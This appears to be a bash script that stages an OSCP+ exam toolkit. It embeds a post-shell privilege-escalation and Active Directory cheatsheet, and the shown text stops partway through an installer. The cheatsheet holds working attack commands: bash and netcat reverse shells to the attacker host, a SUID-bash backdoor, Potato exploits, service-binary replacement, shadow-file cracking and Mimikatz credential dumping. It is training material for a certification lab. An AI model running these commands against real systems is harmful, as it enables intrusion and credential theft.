#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  OSCP+ Toolkit Downloader v6.4 — BloodHound Docker Package                           ║
# ║  Run this on your Kali attacker box BEFORE the exam.                       ║
# ║  Goal: pre-stage initial-access triage and post-shell tools.       ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

set -Eeuo pipefail

# Updated 2026-07-08: chisel 1.11.5 -> 1.11.7, ligolo-ng 0.8.2 -> 0.8.3,
# accesschk now pulled from the official signed Sysinternals zip, impacket no
# longer force-installed via pip (uses apt/pipx to avoid Kali conflicts).
# CopyFail (CVE-2026-31431) PoC hash re-verified and unchanged.
CHISEL_VER="${CHISEL_VER:-1.11.7}"
LIGOLO_VER="${LIGOLO_VER:-0.8.3}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TOOLKIT="${TOOLKIT:-$HOME/privesc-toolkit}"
LHOST="CHANGEME"
LPORT="443"
DRY_RUN=0
STRICT=0
SKIP_PIP=0
SKIP_GEM=0
SKIP_CLONE=0
FAILED=()
WARNINGS=()

usage() {
cat <<'EOF'
Usage:
  ./oscp-toolkit-setup-v6.sh [options] [LHOST] [LPORT]

Examples:
  ./oscp-toolkit-setup-v6.sh
  ./oscp-toolkit-setup-v6.sh 192.168.45.200
  ./oscp-toolkit-setup-v6.sh 192.168.45.200 443
  TOOLKIT=/opt/privesc-toolkit ./oscp-toolkit-setup-v6.sh 192.168.45.200 443
  ./oscp-toolkit-setup-v6.sh --dry-run 192.168.45.200 443

Options:
  --dry-run       Validate flow without downloading external files
  --strict        Exit on first failed download/install instead of continuing
  --skip-pip      Do not pip install attacker-side Python packages
  --skip-gem      Do not gem install evil-winrm
  --skip-clone    Do not git clone source repositories
  -h, --help      Show this help
EOF
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --dry-run) DRY_RUN=1; shift ;;
        --strict) STRICT=1; shift ;;
        --skip-pip) SKIP_PIP=1; shift ;;
        --skip-gem) SKIP_GEM=1; shift ;;
        --skip-clone) SKIP_CLONE=1; shift ;;
        -h|--help) usage; exit 0 ;;
        *)
            if [[ "$LHOST" == "CHANGEME" ]]; then
                LHOST="$1"
            elif [[ "$LPORT" == "443" ]]; then
                LPORT="$1"
            else
                echo "[!] Extra argument ignored: $1"
            fi
            shift
            ;;
    esac
done

mkdir -p "$TOOLKIT"/{linux/{kernel-exploits/{DirtyPipe,PwnKit,CopyFail},templates},windows,webshells,attacker/{exploits,bloodhound-docker,source,decryptors,wordlists},templates/{linux,web,sql,services}}
cd "$TOOLKIT"

fail_or_continue() {
    local item="$1"
    FAILED+=("$item")
    echo "    [!] FAILED: $item"
    if [[ "$STRICT" == "1" ]]; then
        exit 1
    fi
    return 0
}

warn() {
    WARNINGS+=("$1")
    echo "    [!] $1"
}

need() {
    local cmd="$1"
    if ! command -v "$cmd" >/dev/null 2>&1; then
        warn "Missing dependency: $cmd"
        return 1
    fi
}

have() { command -v "$1" >/dev/null 2>&1; }

preflight() {
    echo "[*] Preflight checks"
    local required=(curl wget unzip tar gzip gunzip git grep sed awk find xargs chmod file sha256sum python3 base64)
    for c in "${required[@]}"; do need "$c" || true; done

    if [[ "$DRY_RUN" == "1" ]]; then
        echo "    → Dry run mode: external downloads/installs will be skipped"
    fi
    if ! have msfvenom; then warn "msfvenom not found; pre-generated payloads will be skipped"; fi
    if ! have docker; then warn "docker not found; BloodHound CE Docker helper will be staged but cannot run until Docker is installed"; fi
    if have docker && ! docker compose version >/dev/null 2>&1 && ! have docker-compose; then warn "Docker found, but Docker Compose was not found; install docker-compose-plugin or docker-compose"; fi
    if ! have gcc; then warn "gcc not found; C exploits will not be pre-compiled"; fi
}

# Safe download: fails on HTTP errors, follows redirects, retries, verifies non-empty.
dl() {
    local out="$1" url="$2" tmp
    echo "    -> $out"
    if [[ "$DRY_RUN" == "1" ]]; then
        echo "       dry-run: would download $url"
        return 0
    fi
    mkdir -p "$(dirname "$out")"
    tmp="$(mktemp)"
    if ! curl -fL --retry 3 --retry-delay 2 --connect-timeout 10 --max-time 240 -o "$tmp" "$url"; then
        rm -f "$tmp"
        fail_or_continue "$out from $url"
        return 0
    fi
    if [[ ! -s "$tmp" ]]; then
        rm -f "$tmp"
        fail_or_continue "$out from $url (empty file)"
        return 0
    fi
    mv "$tmp" "$out"
}

dl_gz() {
    local out="$1" url="$2" tmp
    echo "    -> $out"
    if [[ "$DRY_RUN" == "1" ]]; then
        echo "       dry-run: would download $url"
        return 0
    fi
    mkdir -p "$(dirname "$out")"
    tmp="$(mktemp)"
    if ! curl -fL --retry 3 --retry-delay 2 --connect-timeout 10 --max-time 240 "$url" | gunzip > "$tmp"; then
        rm -f "$tmp"
        fail_or_continue "$out from $url"
        return 0
    fi
    if [[ ! -s "$tmp" ]]; then
        rm -f "$tmp"
        fail_or_continue "$out from $url (empty decompressed file)"
        return 0
    fi
    mv "$tmp" "$out"
}

dl_zip_first() {
    local out="$1" url="$2" tmpdir zipfile first
    echo "    -> $out"
    if [[ "$DRY_RUN" == "1" ]]; then
        echo "       dry-run: would download $url"
        return 0
    fi
    mkdir -p "$(dirname "$out")"
    tmpdir="$(mktemp -d)"
    zipfile="$tmpdir/archive.zip"
    if ! curl -fL --retry 3 --retry-delay 2 --connect-timeout 10 --max-time 240 -o "$zipfile" "$url"; then
        rm -rf "$tmpdir"
        fail_or_continue "$out from $url"
        return 0
    fi
    unzip -qo "$zipfile" -d "$tmpdir/extract" || { rm -rf "$tmpdir"; fail_or_continue "$out unzip from $url"; return 0; }
    first="$(find "$tmpdir/extract" -type f | head -n 1 || true)"
    if [[ -z "$first" ]]; then
        rm -rf "$tmpdir"
        fail_or_continue "$out from $url (zip had no files)"
        return 0
    fi
    mv "$first" "$out"
    rm -rf "$tmpdir"
}

# Download a zip and extract the first file matching a regex to a specific output path.
dl_zip_match() {
    local out="$1" url="$2" regex="$3" tmpdir zipfile match
    echo "    -> $out"
    if [[ "$DRY_RUN" == "1" ]]; then
        echo "       dry-run: would download $url and extract match $regex"
        return 0
    fi
    mkdir -p "$(dirname "$out")"
    tmpdir="$(mktemp -d)"
    zipfile="$tmpdir/archive.zip"
    if ! curl -fL --retry 3 --retry-delay 2 --connect-timeout 10 --max-time 240 -o "$zipfile" "$url"; then
        rm -rf "$tmpdir"
        fail_or_continue "$out zip from $url"
        return 0
    fi
    if ! unzip -qo "$zipfile" -d "$tmpdir/extract"; then
        rm -rf "$tmpdir"
        fail_or_continue "$out unzip from $url"
        return 0
    fi
    match="$(find "$tmpdir/extract" -type f | grep -Ei "$regex" | head -n 1 || true)"
    if [[ -z "$match" ]]; then
        rm -rf "$tmpdir"
        fail_or_continue "$out from $url (no zip member matched $regex)"
        return 0
    fi
    mv "$match" "$out"
    rm -rf "$tmpdir"
}

dl_zip_dir() {
    local outdir="$1" url="$2" tmp
    echo "    -> $outdir/"
    if [[ "$DRY_RUN" == "1" ]]; then
        echo "       dry-run: would extract $url into $outdir/"
        return 0
    fi
    mkdir -p "$outdir"
    tmp="$(mktemp)"
    if ! curl -fL --retry 3 --retry-delay 2 --connect-timeout 10 --max-time 240 -o "$tmp" "$url"; then
        rm -f "$tmp"
        fail_or_continue "$outdir archive from $url"
        return 0
    fi
    unzip -qo "$tmp" -d "$outdir" || fail_or_continue "$outdir unzip from $url"
    rm -f "$tmp"
}

dl_targz_dir() {
    local outdir="$1" url="$2" tmp
    echo "    -> $outdir/"
    if [[ "$DRY_RUN" == "1" ]]; then
        echo "       dry-run: would extract $url into $outdir/"
        return 0
    fi
    mkdir -p "$outdir"
    tmp="$(mktemp)"
    if ! curl -fL --retry 3 --retry-delay 2 --connect-timeout 10 --max-time 240 -o "$tmp" "$url"; then
        rm -f "$tmp"
        fail_or_continue "$outdir tar.gz from $url"
        return 0
    fi
    tar xzf "$tmp" -C "$outdir" || fail_or_continue "$outdir tar extract from $url"
    rm -f "$tmp"
}

# Resolve a release asset from GitHub by regex. Falls back cleanly when rate-limited.
github_latest_asset() {
    local repo="$1" regex="$2"
    if [[ "$DRY_RUN" == "1" ]]; then
        echo "https://github.com/$repo/releases/latest/download/DRY_RUN_ASSET"
        return 0
    fi
    curl -fsSL "https://api.github.com/repos/$repo/releases/latest" \
        | grep 'browser_download_url' \
        | cut -d '"' -f 4 \
        | grep -E "$regex" \
        | head -n 1
}

dl_latest_asset() {
    local out="$1" repo="$2" regex="$3" url
    url="$(github_latest_asset "$repo" "$regex" || true)"
    if [[ -n "$url" ]]; then
        dl "$out" "$url"
    else
        fail_or_continue "$out latest asset from $repo matching $regex"
    fi
}

git_clone() {
    local repo="$1" dest="$2"
    echo "    -> $dest"
    if [[ "$DRY_RUN" == "1" ]]; then
        mkdir -p "$dest"
        printf 'DRY RUN placeholder for git clone: %s\n' "$repo" > "$dest/DRY_RUN_CLONE.txt"
        return 0
    fi
    if [[ "$SKIP_CLONE" == "1" ]]; then
        warn "Skipping git clone for $repo"
        return 0
    fi
    rm -rf "$dest"
    git clone --depth 1 "$repo" "$dest" || fail_or_continue "git clone $repo"
}

pip_install() {
    local pkg="$1"
    echo "    -> pip package: $pkg"
    if [[ "$DRY_RUN" == "1" || "$SKIP_PIP" == "1" ]]; then
        echo "       skipped"
        return 0
    fi
    if python3 -m pip install "$pkg" --break-system-packages >/dev/null 2>&1; then
        echo "       installed/updated"
    else
        warn "pip install failed for $pkg; try: pipx install $pkg"
    fi
}

gem_install() {
    local pkg="$1"
    echo "    -> gem package: $pkg"
    if [[ "$DRY_RUN" == "1" || "$SKIP_GEM" == "1" ]]; then
        echo "       skipped"
        return 0
    fi
    gem install "$pkg" >/dev/null 2>&1 || warn "gem install failed for $pkg; try: sudo apt install evil-winrm"
}

chmodx() {
    for f in "$@"; do
        [[ -e "$f" ]] && chmod +x "$f" 2>/dev/null || true
    done
}

banner() {
    echo ""
    echo "──── $1 ────"
}

write_local_files() {
    banner "LOCAL CHEATSHEETS AND GUARDRAILS"

    cat > README-FIRST.txt <<EOF
OSCP+ POST-SHELL PANIC README
Toolkit staged at: $TOOLKIT
Kali/LHOST used during setup: $LHOST
Default listener port used during setup: $LPORT

Read this only AFTER you already have code execution or a shell.
Do not use this for initial foothold. That belongs in your foothold checklist.

===============================================================================
0. IF PANICKING, DO THIS EXACTLY
===============================================================================

Do not chase five ideas at once. Get facts, capture proof when available, then run
one clean privilege-escalation path.

Order of operations:
  1. Stabilize the shell if possible.
  2. Identify OS, user, hostname, IP, privileges.
  3. Start one HTTP server from the toolkit root.
  4. Transfer the correct enum tool.
  5. Run the enum tool and save output.
  6. Read the output slowly. Search for passwords, services, writable paths,
     dangerous privileges, backups, configs, logs, scheduled tasks, application
     config encryption, backup folders, disk group, and credential reuse.
  7. Try the simplest confirmed path first.
  8. On root/SYSTEM/admin: capture proof immediately and submit it.
  9. Write notes before moving to the next box.

Hard rule:
  If a path needs a complex exploit but you have not checked creds, backups,
  services, scheduled tasks, sudo, SUID, or privileges, you are probably skipping
  the easy path.

Timebox:
  If no progress after 30-45 minutes, stop and re-run the basic checks manually.
  If the box behaves strangely, revert once. Do not repeatedly break the target.

===============================================================================
1. ATTACKER SETUP - KEEP THESE TERMINALS OPEN
===============================================================================

Terminal 1 - serve the whole toolkit:
  cd $TOOLKIT
  python3 -m http.server 8000

Terminal 2 - listener:
  rlwrap -cAr nc -lvnp $LPORT

If rlwrap is missing:
  nc -lvnp $LPORT

If listening on port 443 gives permission denied:
  sudo rlwrap -cAr nc -lvnp $LPORT

Terminal 3 - notes and commands:
  mkdir -p ~/exam-notes
  cd ~/exam-notes
  script -a target-notes.txt

Useful URLs from targets:
  http://$LHOST:8000/linux/linpeas.sh
  http://$LHOST:8000/linux/lse.sh
  http://$LHOST:8000/linux/pspy64
  http://$LHOST:8000/linux/busybox
  http://$LHOST:8000/windows/winPEASx64.exe
  http://$LHOST:8000/windows/PrivescCheck.ps1
  http://$LHOST:8000/windows/PowerUp.ps1
  http://$LHOST:8000/windows/Get-SiteListPassword.ps1
  http://$LHOST:8000/windows/nc64.exe
  http://$LHOST:8000/windows/Invoke-ConPtyShell.ps1
  http://$LHOST:8000/windows/PsExec64.exe
  http://$LHOST:8000/windows/ligolo-agent.exe

Initial-access attacker-side helpers staged locally:
  $TOOLKIT/attacker/high-port-http-check.sh
  $TOOLKIT/attacker/finger-quick-enum.sh
  $TOOLKIT/attacker/ftp-anon-mirror.sh
  $TOOLKIT/attacker/make-ps-enc.sh
  $TOOLKIT/attacker/decode-helper.sh
  $TOOLKIT/templates/web/sqli-manual-checklist.txt
  $TOOLKIT/templates/web/lfi-payloads.txt
  $TOOLKIT/templates/web/upload-bypass-filenames.txt
  $TOOLKIT/templates/services/redis-cheatsheet.txt
  $TOOLKIT/templates/services/mysql-mariadb-cheatsheet.txt
  $TOOLKIT/templates/services/finger-cheatsheet.txt

===============================================================================
2. PROOF DISCIPLINE - DO NOT DELAY THIS
===============================================================================

When local.txt or proof.txt is accessible, capture it from an interactive shell.
Screenshot must show target IP and proof content.

Linux proof commands:
  whoami
  hostname
  ip addr
  pwd
  cat /home/*/local.txt 2>/dev/null
  cat /root/proof.txt 2>/dev/null

Windows proof commands:
  whoami
  hostname
  ipconfig
  cd
  type C:\Users\%USERNAME%\Desktop\local.txt
  type C:\Users\Administrator\Desktop\proof.txt

If the exact path is different, search:
  dir C:\ /s /b local.txt proof.txt 2>nul
  find / -name local.txt -o -name proof.txt 2>/dev/null

After capturing proof:
  - submit it in the control panel immediately;
  - record exact commands used;
  - record exploit URL/source and modifications if any.

===============================================================================
3. SHELL STABILIZATION
===============================================================================

Linux reverse shell upgrade:
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  export TERM=xterm
  Ctrl-Z
  stty raw -echo; fg
  reset
  stty rows 40 columns 120

If python3 is missing:
  python -c 'import pty; pty.spawn("/bin/bash")'

If python is missing:
  script -qc /bin/bash /dev/null

If shell is still bad:
  /bin/bash -i
  /bin/sh -i

Windows basic shell checks:
  whoami
  hostname
  ipconfig
  ver
  cd

If cmd.exe is awkward, try PowerShell:
  powershell -ep bypass

Create a working directory:
  mkdir C:\Temp 2>nul
  cd C:\Temp

===============================================================================
4. LINUX PRIVILEGE ESCALATION WORKFLOW
===============================================================================

Step 1 - identify context:
  whoami
  id
  hostname
  ip addr
  uname -a
  cat /etc/os-release 2>/dev/null
  pwd
  ls -la

Step 2 - immediate easy wins:
  sudo -l
  find / -perm -4000 -type f 2>/dev/null
  getcap -r / 2>/dev/null
  cat /etc/crontab 2>/dev/null
  ls -la /etc/cron* 2>/dev/null
  systemctl list-timers 2>/dev/null

Step 3 - check credentials and backups:
  ls -la /home
  ls -la /home/* 2>/dev/null
  ls -la /opt /var/backups /backup /srv /tmp /var/tmp 2>/dev/null
  grep -RniE 'pass|password|pwd|user|username|secret|key|token|backup' /home /opt /var/www /srv 2>/dev/null | head -n 80
  find / -type f \( -name '*.bak' -o -name '*.old' -o -name '*.zip' -o -name '*.tar' -o -name '*.gz' -o -name '*.db' -o -name '.env' \) 2>/dev/null | head -n 100

Step 4 - run LinPEAS:
  cd /tmp
  wget http://$LHOST:8000/linux/linpeas.sh -O linpeas.sh || curl http://$LHOST:8000/linux/linpeas.sh -o linpeas.sh
  chmod +x linpeas.sh
  ./linpeas.sh | tee /tmp/linpeas.out

Read LinPEAS output slowly. Do not only look at red lines. Specifically check:
  - passwords in files;
  - sudo entries;
  - SUID binaries;
  - writable files used by root;
  - writable service files;
  - cron jobs;
  - unusual backups;
  - database credentials;
  - SSH keys;
  - kernel version suggestions.

Step 5 - use fallbacks if LinPEAS is too noisy or fails:
  wget http://$LHOST:8000/linux/lse.sh -O lse.sh && chmod +x lse.sh && ./lse.sh -l 1 | tee /tmp/lse.out
  wget http://$LHOST:8000/linux/LinEnum.sh -O LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh | tee /tmp/linenum.out

Step 6 - watch processes if cron, scripts, or backups are suspected:
  wget http://$LHOST:8000/linux/pspy64 -O pspy64
  chmod +x pspy64
  ./pspy64

Step 7 - only then consider kernel exploits:
  wget http://$LHOST:8000/linux/les.sh -O les.sh && chmod +x les.sh && ./les.sh
  wget http://$LHOST:8000/linux/linux-exploit-suggester-2.pl -O les2.pl && perl les2.pl

Kernel exploits are last resort. Confirm architecture, distro, kernel, and compile
requirements first.

If /etc/shadow is readable:
  cat /etc/passwd > /tmp/passwd.txt
  cat /etc/shadow > /tmp/shadow.txt

Copy both files to Kali, then crack:
  unshadow passwd.txt shadow.txt > unshadowed.txt
  john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
  john --show unshadowed.txt


Step 8 - if user is in disk group, use debugfs read-only first:
  id
  df -h
  lsblk
  debugfs /dev/mapper/<ROOT_VOLUME>

Inside debugfs:
  cd /root
  ls
  cat proof.txt
  cat /etc/shadow
  cat /root/.ssh/id_rsa

Do not write to raw disks unless you know exactly why. Disk group is already a major privilege boundary.

Step 9 - if cron/root script runs a relative command from writable PATH:
  cat /etc/crontab
  ./pspy64
  echo $PATH
  ls -ld /dev/shm /tmp /var/tmp

Safe SUID-bash payload for command hijack, replacing <COMMAND> with the relative command name:
  cat > /dev/shm/<COMMAND> <<'PAYLOAD'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
PAYLOAD
  chmod +x /dev/shm/<COMMAND>
  /tmp/rootbash -p

Reverse shell variant if SUID bash fails:
  cat > /dev/shm/<COMMAND> <<'PAYLOAD'
#!/bin/sh
bash -c "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
PAYLOAD
  chmod +x /dev/shm/<COMMAND>

===============================================================================
5. WINDOWS PRIVILEGE ESCALATION WORKFLOW
===============================================================================

Step 1 - identify context:
  whoami
  whoami /priv
  whoami /groups
  hostname
  ipconfig
  ver
  net user %USERNAME%

Step 2 - create workspace and transfer tools:
  mkdir C:\Temp 2>nul
  cd C:\Temp
  certutil -urlcache -f http://$LHOST:8000/windows/winPEASx64.exe winPEASx64.exe
  certutil -urlcache -f http://$LHOST:8000/windows/PrivescCheck.ps1 PrivescCheck.ps1
  certutil -urlcache -f http://$LHOST:8000/windows/PowerUp.ps1 PowerUp.ps1
  certutil -urlcache -f http://$LHOST:8000/windows/nc64.exe nc64.exe

PowerShell download fallback:
  powershell -ep bypass -c "iwr http://$LHOST:8000/windows/winPEASx64.exe -OutFile C:\Temp\winPEASx64.exe"

Step 3 - run WinPEAS and save output:
  C:\Temp\winPEASx64.exe > C:\Temp\winpeas.txt
  type C:\Temp\winpeas.txt

Read winpeas.txt manually. Search for:
  - passwords and autologon;
  - AlwaysInstallElevated;
  - writable services;
  - unquoted service paths;
  - scheduled tasks;
  - saved credentials;
  - interesting files/backups;
  - SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege;
  - local admin membership with medium integrity/UAC issue.

Step 4 - run PrivescCheck:
  powershell -ep bypass
  Import-Module C:\Temp\PrivescCheck.ps1
  Invoke-PrivescCheck

One-line fallback:
  powershell -ep bypass -c "Import-Module C:\Temp\PrivescCheck.ps1; Invoke-PrivescCheck"

Step 5 - run PowerUp for service abuse checks:
  powershell -ep bypass -c "Import-Module C:\Temp\PowerUp.ps1; Invoke-AllChecks"

Step 6 - manual checks that often matter:
  cmdkey /list
  net localgroup administrators
  net localgroup "Remote Desktop Users"
  net users
  dir C:\Users\ /a
  dir C:\ /s /b *pass* *cred* *backup* *.config *.ini *.kdbx 2>nul
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul
  schtasks /query /fo LIST /v

Service checks:
  sc query state= all
  wmic service get name,displayname,pathname,startmode | findstr /i "auto"
  powershell -ep bypass -c "Get-CimInstance Win32_Service | ?{\$_.StartMode -eq 'Auto'} | select Name,StartName,PathName"

===============================================================================
6. WINDOWS TOOL DECISION GUIDE
===============================================================================

Use WinPEAS:
  - first full-pass Windows enumeration;
  - when you do not know the privesc path yet.

Use PrivescCheck:
  - after WinPEAS;
  - when PowerShell works;
  - to confirm services, registry, credentials, UAC, scheduled task findings.

Use PowerUp:
  - when WinPEAS/PrivescCheck mentions services;
  - when checking modifiable service binary paths, weak permissions, or unquoted paths.

Use FullPowers:
  - when running as a service account and privileges look suspiciously missing;
  - before Potato attempts if expected privileges are absent.

Use Potato tools:
  - when whoami /priv shows SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege;
  - common order: GodPotato -> PrintSpoofer -> SigmaPotato -> JuicyPotatoNG -> RoguePotato.

Example GodPotato:
  C:\Temp\GodPotato-NET4.exe -cmd "cmd /c C:\Temp\nc64.exe -e cmd.exe $LHOST $LPORT"

Example PrintSpoofer:
  C:\Temp\PrintSpoofer64.exe -c "C:\Temp\nc64.exe -e cmd.exe $LHOST $LPORT"

Use UAC bypass only when:
  - you are already local admin;
  - shell is medium integrity/restricted;
  - whoami /groups shows admin membership but actions are blocked.

Check integrity/admin state:
  whoami /groups
  net localgroup administrators

Application credential files and encrypted configs:
  dir C:\ /s /b *pass* *cred* *secret* *config* *.xml *.ini *.db *.bak 2>nul
  dir C:\ /s /b SiteList.xml 2>nul
  dir C:\ProgramData /s /b *.xml *.ini *.config *.db 2>nul

McAfee SiteList.xml quick path:
  dir C:\ /s /b SiteList.xml 2>nul
  type "C:\ProgramData\McAfee\Common Framework\SiteList.xml"
  type "C:\Users\All Users\McAfee\Common Framework\SiteList.xml"

Copy the encrypted password value to Kali and decrypt:
  cd $TOOLKIT/attacker/decryptors/mcafee-sitelist-pwd-decryption
  python3 -m pip install --user pycryptodomex 2>/dev/null || true
  python3 mcafee_sitelist_pwd_decrypt.py '<ENCRYPTED_BASE64_PASSWORD>'

Try decrypted credentials carefully:
  nxc smb <TARGET_IP> -u '<USER>' -p '<PASS>' --local-auth
  nxc winrm <TARGET_IP> -u '<USER>' -p '<PASS>' --local-auth
  xfreerdp /u:<USER> /p:'<PASS>' /v:<TARGET_IP> /cert:ignore

Watchdog or auto-restarting service:
  tasklist /svc
  wmic service get name,displayname,pathname,startmode,state | findstr /i "watch agent backup dvr update monitor"
  sc qc <SERVICE_NAME>
  icacls "C:\Path\To\ServiceFolder"
  icacls "C:\Path\To\service.exe"

If the service binary or folder is writable, replace only after backing it up:
  copy "C:\Path\To\service.exe" C:\Temp\service.exe.bak
  copy /Y C:\Temp\rev64.exe "C:\Path\To\service.exe"
  sc stop <SERVICE_NAME>
  sc start <SERVICE_NAME>

If a watchdog restarts it automatically, start your listener and wait.

Use Mimikatz only when:
  - you already have high integrity/admin/SYSTEM, or you know why it should work;
  - you need creds/tokens for lateral movement or AD completion.

Prefer the pinned stable Mimikatz copy first if latest behaves oddly:
  C:\Temp\mimikatz.exe
  privilege::debug
  sekurlsa::logonpasswords

===============================================================================
7. AD POST-SHELL WORKFLOW
===============================================================================

After getting a shell on an AD-joined machine:
  whoami /all
  hostname
  ipconfig /all
  net user /domain
  net group /domain
  net group "Domain Admins" /domain
  nltest /domain_trusts
  set

Look for:
  - domain usernames;
  - reused local/domain passwords;
  - service account creds;
  - Kerberoastable users;
  - write permissions such as GenericAll, GenericWrite, WriteDACL, WriteOwner;
  - RDP/WinRM/SMB reuse;
  - files, backups, scripts, logs containing credentials.

Kerberoast from Kali when you have valid creds:
  impacket-GetUserSPNs DOMAIN/user:password -dc-ip DC_IP -request

Password reuse checks from Kali:
  nxc smb TARGETS.txt -u user -p 'password' --continue-on-success
  nxc winrm TARGETS.txt -u user -p 'password' --continue-on-success
  nxc rdp TARGETS.txt -u user -p 'password' --continue-on-success

If a credential works over WinRM:
  evil-winrm -i TARGET_IP -u user -p 'password'

If a credential works over RDP:
  xfreerdp /u:user /p:'password' /v:TARGET_IP /cert:ignore +clipboard

===============================================================================
7A. BLOODHOUND CE DOCKER - START AND INGEST
===============================================================================

Start BloodHound CE Docker/CLI stack on Kali:
  cd $TOOLKIT/attacker/bloodhound-docker
  ./install-or-start-bloodhound-ce.sh
  ./status-bloodhound-ce.sh

Open in browser:
  http://localhost:8080/ui/login

Login:
  Username: admin
  Password: use the generated password from first install, or reset it:
    cd $TOOLKIT/attacker/bloodhound-docker
    ./reset-bloodhound-password.sh

Collect from Windows foothold using SharpHound:
  mkdir C:\Temp 2>nul
  cd C:\Temp
  certutil -urlcache -f http://$LHOST:8000/windows/SharpHound/SharpHound.exe SharpHound.exe
  SharpHound.exe -c All --zipfilename loot.zip

Then download the ZIP to Kali and upload it through BloodHound CE Quick Upload.

Alternative from Kali with valid domain creds:
  nxc ldap <DC_IP> -u '<USER>' -p '<PASS>' --bloodhound --collection All --dns-server <DC_IP>

This toolkit does not require bloodhound-ce-python. Use it only if you intentionally
install the Kali apt package separately.

===============================================================================
8. LIGOLO PIVOT - SIMPLE AD PIVOT
===============================================================================

Use Ligolo when the compromised host can reach an internal subnet that Kali cannot
reach directly.

Attacker setup:
  cd $TOOLKIT/attacker
  sudo ip tuntap add user \$(whoami) mode tun ligolo 2>/dev/null || true
  sudo ip link set ligolo up
  ./ligolo-proxy -selfcert

Windows target agent:
  cd C:\Temp
  certutil -urlcache -f http://$LHOST:8000/windows/ligolo-agent.exe ligolo-agent.exe
  ligolo-agent.exe -connect $LHOST:11601 -ignore-cert

Linux target agent:
  cd /tmp
  wget http://$LHOST:8000/linux/ligolo-agent -O ligolo-agent || curl http://$LHOST:8000/linux/ligolo-agent -o ligolo-agent
  chmod +x ligolo-agent
  ./ligolo-agent -connect $LHOST:11601 -ignore-cert

Inside ligolo-proxy:
  session
  ifconfig
  start

In another Kali terminal, add a route to the internal subnet shown by ifconfig.
Replace INTERNAL_CIDR with the real subnet, for example 172.16.1.0/24:
  sudo ip route add INTERNAL_CIDR dev ligolo

Scan through the pivot:
  nmap -Pn -sT -p 21,22,80,88,135,139,389,445,464,593,636,3389,5985,5986 INTERNAL_TARGET
  nmap -Pn -sT -p- --min-rate 1000 INTERNAL_TARGET

If the route already exists or is wrong:
  ip route
  sudo ip route del INTERNAL_CIDR dev ligolo
  sudo ip route add INTERNAL_CIDR dev ligolo

Reverse shell from internal target back through Ligolo:
  1. In ligolo-proxy, add a listener:
       listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:$LPORT --tcp
  2. On Kali, listen:
       rlwrap -cAr nc -lvnp $LPORT
  3. Make the internal target connect to PIVOT_HOST_INTERNAL_IP:4444.

Ligolo troubleshooting:
  - Use nmap -Pn -sT, not SYN scan, through the pivot.
  - Confirm the agent session is selected before start.
  - Confirm sudo ip link set ligolo up was run.
  - Confirm the route points to dev ligolo.
  - If scans hang, test one known port first.
  - If DNS fails, use IP addresses first.

===============================================================================
9. WHEN STUCK
===============================================================================

Linux stuck checklist:
  sudo -l
  find / -perm -4000 -type f 2>/dev/null
  getcap -r / 2>/dev/null
  ps auxww
  cat /etc/crontab 2>/dev/null
  ls -la /opt /srv /var/www /var/backups /backup 2>/dev/null
  grep -RniE 'pass|password|secret|backup|token|key' /home /opt /srv /var/www 2>/dev/null | head -n 80

Windows stuck checklist:
  whoami /priv
  whoami /groups
  cmdkey /list
  net localgroup administrators
  net localgroup "Remote Desktop Users"
  schtasks /query /fo LIST /v
  dir C:\ /s /b *pass* *cred* *backup* *.config *.ini *.kdbx 2>nul
  type C:\Temp\winpeas.txt | findstr /i "password autologon service unquoted writable impersonate backup"

AD stuck checklist:
  Re-check creds. Reuse is common.
  Re-check RDP/WinRM/SMB with every valid username/password pair.
  Re-check file shares for backups, scripts, logs, and config files.
  Re-check BloodHound paths for WriteDACL/GenericAll/GenericWrite/WriteOwner.
  Re-check whether you need a pivot before attacking the next host.

EOF

    cat > attacker/verify-kali-tools.sh <<'EOF'
#!/usr/bin/env bash
set -u
TOOLS=(nmap feroxbuster gobuster ffuf whatweb hydra curl wget nc telnet ftp dig host nmblookup rpcclient showmount smbclient smbmap enum4linux-ng snmpwalk onesixtyone ldapsearch xfreerdp evil-winrm nxc netexec impacket-secretsdump impacket-smbserver impacket-mssqlclient hashcat john unshadow jq rlwrap msfvenom searchsploit sqlite3 mysql psql redis-cli mosquitto_sub mosquitto_pub smtp-user-enum finger wpscan git-dumper keepassxc-cli gpp-decrypt)
missing=0
for t in "${TOOLS[@]}"; do
    if command -v "$t" >/dev/null 2>&1; then
        printf '[ OK ] %s\n' "$t"
    else
        printf '[MISS] %s\n' "$t"
        missing=1
    fi
done

if command -v docker >/dev/null 2>&1; then
    printf '[ OK ] docker\n'
else
    printf '[MISS] docker\n'
    missing=1
fi

if docker compose version >/dev/null 2>&1 || command -v docker-compose >/dev/null 2>&1; then
    printf '[ OK ] docker compose\n'
else
    printf '[MISS] docker compose\n'
    missing=1
fi

if [[ -x "$HOME/privesc-toolkit/attacker/bloodhound-docker/bloodhound-cli" ]]; then
    printf '[ OK ] bloodhound-cli staged\n'
else
    printf '[MISS] bloodhound-cli staged\n'
    missing=1
fi

if [[ -f "$HOME/privesc-toolkit/windows/SharpHound/SharpHound.exe" || -f "$HOME/privesc-toolkit/windows/SharpHound.exe" ]]; then
    printf '[ OK ] SharpHound staged\n'
else
    printf '[MISS] SharpHound staged\n'
    missing=1
fi

exit "$missing"
EOF
    chmod +x attacker/verify-kali-tools.sh

    cat > attacker/install-kali-deps.sh <<'EOF'
#!/usr/bin/env bash
set -Eeuo pipefail
sudo apt update

install_pkg() {
  for pkg in "$@"; do
    echo "[+] apt install $pkg"
    sudo apt install -y "$pkg" || echo "[!] apt install failed or package unavailable: $pkg"
  done
}

# Core scanners, web enum, and shell utilities
install_pkg nmap curl wget netcat-traditional netcat-openbsd rlwrap seclists feroxbuster gobuster ffuf whatweb hydra telnet ftp dnsutils bind9-host nfs-common jq exploitdb sqlite3 git pipx ruby-full gcc make mingw-w64 docker.io docker-compose docker-compose-plugin

